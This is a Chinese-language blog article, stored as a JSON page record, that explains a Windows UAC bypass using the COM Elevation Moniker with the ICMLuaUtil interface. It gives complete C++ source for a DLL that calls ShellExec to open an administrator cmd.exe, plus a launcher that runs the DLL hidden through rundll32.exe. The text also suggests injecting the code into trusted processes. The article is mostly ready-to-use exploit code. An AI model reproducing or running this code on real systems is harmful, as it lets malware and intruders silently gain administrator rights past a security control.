{"title":"基于COM组件接口ICMLuaUtil的BypassUAC","uid":"7db197bf46894f90ba498dec9a89d5fd","slug":"zl/2016-01-01-378_基于COM组件接口ICMLuaUtil的BypassUAC","date":"2024-04-03T03:47:35.663Z","updated":"2024-04-03T03:47:35.664Z","comments":true,"path":"api/articles/zl/2016-01-01-378_基于COM组件接口ICMLuaUtil的BypassUAC.json","keywords":"AIGC,LLM,糖果AIGC实验室","cover":"https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg","content":"<p><strong>lfish</strong></p>\n<h3 id=\"提权原理\">提权原理</h3>\n<p>COM提升名称（COM Elevation Moniker）技术允许运行在用户账户控制下的应用程序用<u>提升权限的方法来激活COM类</u>，以提升COM接口权限。同时，ICMLuaUtil接口提供了ShellExec方法来执行命令，创建指定进程。</p>\n<p>因此，我们可以利用COM提升名称来对ICMLuaUtil接口提权，之后通过接口调用ShellExec方法来创建指定进程，实现BypassUAC。</p>\n<h3 id=\"实现思路\">实现思路</h3>\n<p>和之前常规调用COM组件接口的方式有所不同。在初始化COM环境之后，必须通过CoCreateInstanceAsAdmin函数来创建COM类才能使用权限提升COM类的程序。（具体操作看代码演示）</p>\n<p>通过上述方法创建并激活ICMLuaUtil接口后，直接调用ShellExec方法来创建指定进程，实现BypassUAC。</p>\n<p><strong>注意</strong>，如果执行COM提升名称代码的程序身份是不可信的，还是会触发UAC弹窗；若是可信程序，则不会触发UAC弹窗。因此，必须使这段代码在WIndows可信程序中运行。可信程序有计算器、记事本、资源管理器、rundll32.exe等。可以通过DLL注入或是劫持技术，将这段代码注入到这些可信程序的进程空间当中。</p>\n<p>其中，最简单的方式是将代码编写在DLL文件当中，然后直接通过rundll32.exe来运行DLL，执行COM提升名称的代码。</p>\n<h3 id=\"rundll32-exe介绍\">rundll32.exe介绍</h3>\n<p>rundll32.exe是WIndows系统中的一个程序，顾名思义，就是用来执行32位的DLL文件（DLL内部的具体函数）。系统中还有一个Rundll.exe文件，他的意思是“执行16位的DLL文件”。</p>\n<p>rundll32.exe的具体作用是以命令行的方式调用动态链接程序库中的规定形式的导出函数。导出函数必须是如下形式：</p>\n<pre><code class=\"language-c++\">Void CALLBACK FunctionName (\n\tHWND hwnd,\n\tHINSTANCE hinst,\n\tLPTSTR lpCmdLine,\n\tInt nCmdShow\n);\n</code></pre>\n<p>rundll32.exe在命令行下的使用方法为：</p>\n<p><code>Rundll32.exe DLLname,Functionname [Arguments]</code></p>\n<p>DLLname为需要执行的DLL文件名；</p>\n<p>Functionname为需要执行的DLL文件的规定形式导出函数；</p>\n<p>[Arguments]为引出函数的具体参数。</p>\n<p><strong>注意</strong>：</p>\n<p>C:WindowsSystem32目录中的rundll32.exe用来调用32位DLL</p>\n<p>C:WindowsSysWOW64中的rundll32.exe用来调用64位DLL（SysWOW64是64位系统对32位程序的System32文件夹的重定向）</p>\n<p>系统中还有一个Rundll.exe文件，他的意思是“执行16位的DLL文件”。</p>\n<h3 id=\"代码演示\">代码演示</h3>\n<p>这是含有COM提升名称代码导出函数的DLL源代码（包含了头文件），对于COM编程不必深究，重要的是提权的原理。</p>\n<pre><code class=\"language-c++\">// headers and definitions\n#include &#34;pch.h&#34;\n\n#include &lt;objbase.h&gt;\n#include &lt;strsafe.h&gt;\n\n#define CLSID_CMSTPLUA                     L&#34;&#123;3E5FC7F9-9A51-4367-9063-A120244FBEC7&#125;&#34;\n#define IID_ICMLuaUtil                     L&#34;&#123;6EDD6D74-C007-4E75-B76A-E5740995E24C&#125;&#34;\n\ntypedef interface ICMLuaUtil ICMLuaUtil;\n\ntypedef struct ICMLuaUtilVtbl &#123;\n\n\tBEGIN_INTERFACE\n\n\t\tHRESULT(STDMETHODCALLTYPE* QueryInterface)(\n\t\t\t__RPC__in ICMLuaUtil* This,\n\t\t\t__RPC__in REFIID riid,\n\t\t\t_COM_Outptr_  void** ppvObject);\n\n\tULONG(STDMETHODCALLTYPE* AddRef)(\n\t\t__RPC__in ICMLuaUtil* This);\n\n\tULONG(STDMETHODCALLTYPE* Release)(\n\t\t__RPC__in ICMLuaUtil* This);\n\n\tHRESULT(STDMETHODCALLTYPE* Method1)(\n\t\t__RPC__in ICMLuaUtil* This);\n\n\tHRESULT(STDMETHODCALLTYPE* Method2)(\n\t\t__RPC__in ICMLuaUtil* This);\n\n\tHRESULT(STDMETHODCALLTYPE* Method3)(\n\t\t__RPC__in ICMLuaUtil* This);\n\n\tHRESULT(STDMETHODCALLTYPE* Method4)(\n\t\t__RPC__in ICMLuaUtil* This);\n\n\tHRESULT(STDMETHODCALLTYPE* Method5)(\n\t\t__RPC__in ICMLuaUtil* This);\n\n\tHRESULT(STDMETHODCALLTYPE* Method6)(\n\t\t__RPC__in ICMLuaUtil* This);\n\n\tHRESULT(STDMETHODCALLTYPE* ShellExec)(\n\t\t__RPC__in ICMLuaUtil* This,\n\t\t_In_     LPCWSTR lpFile,\n\t\t_In_opt_  LPCTSTR lpParameters,\n\t\t_In_opt_  LPCTSTR lpDirectory,\n\t\t_In_      ULONG fMask,\n\t\t_In_      ULONG nShow\n\t\t);\n\n\tHRESULT(STDMETHODCALLTYPE* SetRegistryStringValue)(\n\t\t__RPC__in ICMLuaUtil* This,\n\t\t_In_      HKEY hKey,\n\t\t_In_opt_  LPCTSTR lpSubKey,\n\t\t_In_opt_  LPCTSTR lpValueName,\n\t\t_In_      LPCTSTR lpValueString\n\t\t);\n\n\tHRESULT(STDMETHODCALLTYPE* Method9)(\n\t\t__RPC__in ICMLuaUtil* This);\n\n\tHRESULT(STDMETHODCALLTYPE* Method10)(\n\t\t__RPC__in ICMLuaUtil* This);\n\n\tHRESULT(STDMETHODCALLTYPE* Method11)(\n\t\t__RPC__in ICMLuaUtil* This);\n\n\tHRESULT(STDMETHODCALLTYPE* Method12)(\n\t\t__RPC__in ICMLuaUtil* This);\n\n\tHRESULT(STDMETHODCALLTYPE* Method13)(\n\t\t__RPC__in ICMLuaUtil* This);\n\n\tHRESULT(STDMETHODCALLTYPE* Method14)(\n\t\t__RPC__in ICMLuaUtil* This);\n\n\tHRESULT(STDMETHODCALLTYPE* Method15)(\n\t\t__RPC__in ICMLuaUtil* This);\n\n\tHRESULT(STDMETHODCALLTYPE* Method16)(\n\t\t__RPC__in ICMLuaUtil* This);\n\n\tHRESULT(STDMETHODCALLTYPE* Method17)(\n\t\t__RPC__in ICMLuaUtil* This);\n\n\tHRESULT(STDMETHODCALLTYPE* Method18)(\n\t\t__RPC__in ICMLuaUtil* This);\n\n\tHRESULT(STDMETHODCALLTYPE* Method19)(\n\t\t__RPC__in ICMLuaUtil* This);\n\n\tHRESULT(STDMETHODCALLTYPE* Method20)(\n\t\t__RPC__in ICMLuaUtil* This);\n\n\tEND_INTERFACE\n\n&#125; *PICMLuaUtilVtbl;\n\ninterface ICMLuaUtil\n&#123;\n\tCONST_VTBL struct ICMLuaUtilVtbl* lpVtbl;\n&#125;;\n\nHRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID* ppVoid);\n\nBOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable);\n\n// import func called by rundll32.exe\nvoid CALLBACK BypassUAC(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, int iCmdShow);\n\n\n// main logic of dll\nBOOL APIENTRY DllMain( HMODULE hModule,\n                       DWORD  ul_reason_for_call,\n                       LPVOID lpReserved\n                     )\n&#123;\n    switch (ul_reason_for_call)\n    &#123;\n    case DLL_PROCESS_ATTACH:\n    case DLL_THREAD_ATTACH:\n    case DLL_THREAD_DETACH:\n    case DLL_PROCESS_DETACH:\n        break;\n    &#125;\n    return TRUE;\n&#125;\n\n// import func called by rundll32.exe\nvoid CALLBACK BypassUAC(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, int iCmdShow)\n&#123;\n\tCMLuaUtilBypassUAC((LPWSTR)L&#34;C:\\Windows\\System32\\cmd.exe&#34;);\n&#125;\n\nHRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID* ppVoid)\n&#123;\n\tBIND_OPTS3 bo;\n\tWCHAR wszCLSID[MAX_PATH] = &#123; 0 &#125;;\n\tWCHAR wszMonikerName[MAX_PATH] = &#123; 0 &#125;;\n\tHRESULT hr = 0;\n\n\t// init env of COM\n\t::CoInitialize(NULL);\n\n\t// construct string\n\t::StringFromGUID2(rclsid, wszCLSID, (sizeof(wszCLSID) / sizeof(wszCLSID[0])));\n\thr = ::StringCchPrintfW(wszMonikerName, (sizeof(wszMonikerName) / sizeof(wszMonikerName[0])), L&#34;Elevation:Administrator!new:%s&#34;, wszCLSID);\n\tif (FAILED(hr))\n\t&#123;\n\t\treturn hr;\n\t&#125;\n\n\t// set BIND_OPTS3\n\t::RtlZeroMemory(&amp;bo, sizeof(bo));\n\tbo.cbStruct = sizeof(bo);\n\tbo.hwnd = hWnd;\n\tbo.dwClassContext = CLSCTX_LOCAL_SERVER;\n\n\t// create get name object and get COM object\n\thr = ::CoGetObject(wszMonikerName, &amp;bo, riid, ppVoid);\n\treturn hr;\n&#125;\n\nBOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable)\n&#123;\n\tHRESULT hr = 0;\n\tCLSID clsidICMLuaUtil = &#123; 0 &#125;;\n\tIID iidICMLuaUtil = &#123; 0 &#125;;\n\tICMLuaUtil* CMLuaUtil = NULL;\n\tBOOL bRet = FALSE;\n\n\tdo &#123;\n\t\t::CLSIDFromString(CLSID_CMSTPLUA, &amp;clsidICMLuaUtil);\n\t\t::IIDFromString(IID_ICMLuaUtil, &amp;iidICMLuaUtil);\n\n\t\t// improve privilege\n\t\thr = CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&amp;CMLuaUtil));\n\t\tif (FAILED(hr))\n\t\t&#123;\n\t\t\tbreak;\n\t\t&#125;\n\n\t\t// start proc\n\t\thr = CMLuaUtil-&gt;lpVtbl-&gt;ShellExec(CMLuaUtil, lpwszExecutable, NULL, NULL, 0, SW_SHOW);\n\t\tif (FAILED(hr))\n\t\t&#123;\n\t\t\tbreak;\n\t\t&#125;\n\n\t\tbRet = TRUE;\n\t&#125; while (FALSE);\n\n\t// release\n\tif (CMLuaUtil)\n\t&#123;\n\t\tCMLuaUtil-&gt;lpVtbl-&gt;Release(CMLuaUtil);\n\t&#125;\n\n\treturn bRet;\n&#125;\n</code></pre>\n<p>这是启动rundll32.exe的程序源代码：</p>\n<pre><code class=\"language-c++\">#include &lt;stdio.h&gt;\n#include &lt;Windows.h&gt;\n\n\nint main()\n&#123;\n\tchar szCmdLine[MAX_PATH] = &#123; 0 &#125;;\n\tchar szRundll32Path[MAX_PATH] = &#34;C:\\Windows\\System32\\rundll32.exe&#34;;\n\tchar szDllPath[MAX_PATH] = &#34;C:\\Users\\lfish\\Projects\\BypassUAC2Dll\\Debug\\BypassUAC2Dll.dll&#34;;\n\t::sprintf_s(szCmdLine, &#34;%s &#34;%s&#34; %s&#34;, szRundll32Path, szDllPath, &#34;BypassUAC&#34;);\n\t::WinExec(szCmdLine, SW_HIDE);\n\n\tprintf(&#34;Run OK.n&#34;);\n\tsystem(&#34;pause&#34;);\n\treturn 0;\n&#125;\n</code></pre>\n<p>注意代码中的dll路径是相对rundll32.exe而言的，因为是rundll32.exe来运行dll。</p>\n<p>运行程序，成功得到管理员权限的cmd窗口：</p>\n<p><img src=\"https://lfishrhungry.github.io//img/Screen Shot 2019-08-14 at 9.44.27 AM.png\" alt=\"\"/></p>\n<h3 id=\"关于重定向\">关于重定向</h3>\n<p>我们编译了32位的测试程序和32位的dll，所以访问64位WIndows10系统的System32文件夹时会被重定向到SysWOW64文件夹，正好其中的rundll32.exe就是用来运行32位dll。</p>\n<p>如果32位程序想要调用64位版的rundll32.exe，可以调用Wow64DisableWow64FsRedirection函数和Wow64RevertWow64FsRedirection函数来关闭和恢复文件重定向。（一定要及时恢复文件重定向，否则系统会出一些问题）</p>\n<p>同时32位程序在访问64位系统的注册表时，也会出现注册表重定向情况，可以在调用RegCreateKeyEx函数打卡注册表时设置KEY_WOW64_64KEY的注册表访问权限，确保访问到64位下的注册表，不被注册表重定向。</p>","text":"lfish 提权原理 COM提升名称（COM Elevation Moniker）技术允许运行在用户账户控制下的应用程序用提升权限的方法来激活COM类，以提升COM接口权限。同时，ICMLuaUtil接口提供了ShellExec方法来执行命令，创建指定进程。 因此，我们可以利用C...","link":"","photos":[],"count_time":{"symbolsCount":"7.2k","symbolsTime":"7 mins."},"categories":[{"name":"topic","slug":"topic","count":1441,"path":"api/categories/topic.json"}],"tags":[{"name":"lua文章","slug":"lua文章","count":1133,"path":"api/tags/lua文章.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%8F%90%E6%9D%83%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">提权原理</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E7%8E%B0%E6%80%9D%E8%B7%AF\"><span class=\"toc-text\">实现思路</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#rundll32-exe%E4%BB%8B%E7%BB%8D\"><span class=\"toc-text\">rundll32.exe介绍</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BB%A3%E7%A0%81%E6%BC%94%E7%A4%BA\"><span class=\"toc-text\">代码演示</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%85%B3%E4%BA%8E%E9%87%8D%E5%AE%9A%E5%90%91\"><span class=\"toc-text\">关于重定向</span></a></li></ol>","author":{"name":"安全书","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"《墨守之道-Web服务安全架构与实践》","socials":{"github":"https://github.com/shengnoah","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"https://weibo.com/u/3732639263","zhihu":"https://www.zhihu.com/people/openresty","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"lua基础学习","uid":"0413f102a34fef56ad449f1f49401157","slug":"zl/2016-01-01-379_lua基础学习","date":"2024-04-03T03:47:35.664Z","updated":"2024-04-03T03:47:35.668Z","comments":true,"path":"api/articles/zl/2016-01-01-379_lua基础学习.json","keywords":"AIGC,LLM,糖果AIGC实验室","cover":"https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg","text":"lua基础学习 lua数据类型八大基本数据类型nil（空），boolean（布尔），number（数字），string（字符串），userdata(自定义类型），function（函数），thread（线程），table（表） lua与C++交互 lua_State状态机lua_...","link":"","photos":[],"count_time":{"symbolsCount":"2.4k","symbolsTime":"2 mins."},"categories":[{"name":"topic","slug":"topic","count":1441,"path":"api/categories/topic.json"}],"tags":[{"name":"lua文章","slug":"lua文章","count":1133,"path":"api/tags/lua文章.json"}],"author":{"name":"安全书","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"《墨守之道-Web服务安全架构与实践》","socials":{"github":"https://github.com/shengnoah","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"https://weibo.com/u/3732639263","zhihu":"https://www.zhihu.com/people/openresty","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Redis Lua脚本中学教程（上）","uid":"88071b57d5fcda24d57749c8fa69c887","slug":"zl/2016-01-01-377_Redis Lua脚本中学教程（上）","date":"2024-04-03T03:47:35.661Z","updated":"2024-04-03T03:47:35.663Z","comments":true,"path":"api/articles/zl/2016-01-01-377_Redis Lua脚本中学教程（上）.json","keywords":"AIGC,LLM,糖果AIGC实验室","cover":"https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg","text":"失踪人口回来啦！ 有读者问我为什么这么久都没有出Redis Lua中学教程，表示村头厕所已经好久没有纸了。其实我早就要写这篇中学教程了，奈何最近太忙了，就一拖再拖，直到今天我终于又开始动笔了。忘记Lua相关概念的同学可以先回顾一下小学教程。 中学教程主要分为两部分：Redis L...","link":"","photos":[],"count_time":{"symbolsCount":"5.1k","symbolsTime":"5 mins."},"categories":[{"name":"topic","slug":"topic","count":1441,"path":"api/categories/topic.json"}],"tags":[{"name":"lua文章","slug":"lua文章","count":1133,"path":"api/tags/lua文章.json"}],"author":{"name":"安全书","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"《墨守之道-Web服务安全架构与实践》","socials":{"github":"https://github.com/shengnoah","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"https://weibo.com/u/3732639263","zhihu":"https://www.zhihu.com/people/openresty","csdn":"","juejin":"","customs":{}}}}}